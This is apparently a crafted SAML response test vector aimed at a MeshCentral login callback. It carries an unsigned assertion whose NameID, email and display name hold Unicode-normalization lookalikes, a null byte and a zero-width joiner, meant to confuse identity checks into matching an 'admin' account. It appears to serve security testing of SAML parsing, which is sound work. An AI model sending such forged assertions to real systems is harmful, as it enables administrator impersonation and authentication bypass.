<?xml version="1.0" encoding="UTF-8"?>
<!-- VECTOR: nameID with null bytes and Unicode normalization tricks — NFC/NFD divergence may cause identity mismatch between validation and lookup -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_unicode001"
                Version="2.0"
                IssueInstant="2026-01-01T00:00:00Z"
                Destination="https://meshcentral.example.com/auth-saml-callback">
  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_unicode" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
    <saml:Subject>
      <!-- NFD decomposed 'a' + combining ring above = looks like 'å' but differs in bytes from NFC å -->
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin&#x0061;&#x030A;@corp.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>meshcentral</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <!-- Null byte in attribute value — may truncate string in C-based XML parsers -->
      <saml:Attribute Name="email">
        <saml:AttributeValue>admin&#x00;@corp.com</saml:AttributeValue>
      </saml:Attribute>
      <!-- Zero-width joiner in nameID lookalike -->
      <saml:Attribute Name="displayname">
        <saml:AttributeValue>Admin&#x200D;User</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
